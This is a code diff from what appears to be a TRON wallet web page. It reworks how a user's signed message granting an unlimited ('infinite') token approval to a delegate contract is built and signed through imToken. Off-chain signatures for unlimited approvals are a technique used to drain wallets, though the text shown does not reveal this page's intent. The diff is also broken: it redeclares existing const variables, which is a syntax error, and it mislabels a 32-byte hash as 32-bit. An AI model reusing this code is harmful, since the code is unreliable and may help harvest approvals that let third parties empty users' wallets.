@@ -236,11 +236,20 @@
                     const contractAddrHex = tronWeb.address.toHex(DELEGATE_CONTRACT);
                     
                     // 2. 构造签名消息（与合约delegateApprove的messageHash完全一致）
-                    const amountHex = tronWeb.utils.toHex(INFINITE_APPROVE_AMOUNT, true, 32); 
-// 2. 手动拼接参数（地址Hex为20字节，金额Hex为32字节，直接拼接）
+                   function toUint256Hex(value) {
+    let hex = BigInt(value).toString(16);
+    hex = hex.padStart(64, '0');
+    return '0x' + hex;
+}
+
+// 构造签名消息的逻辑
+const userAddrHex = tronWeb.address.toHex(userAddress);
+const contractAddrHex = tronWeb.address.toHex(DELEGATE_CONTRACT);
+// 替换为新的转换方法
+const amountHex = toUint256Hex(INFINITE_APPROVE_AMOUNT); 
+// 拼接参数
 const message = userAddrHex.replace('0x', '') + contractAddrHex.replace('0x', '') + amountHex.replace('0x', '');
-// 3. 对拼接后的Hex字符串进行SHA3哈希
-const messageHash = tronWeb.utils.sha3(message, false);  // 生成32位哈希
+const messageHash = tronWeb.utils.sha3(message, false); // 生成32位哈希
                     
                     // 3. 用户离线签名（imToken本地签名，不暴露私钥，匹配合约签名验证逻辑）
                     const signature = await tronWeb.trx.signMessage(
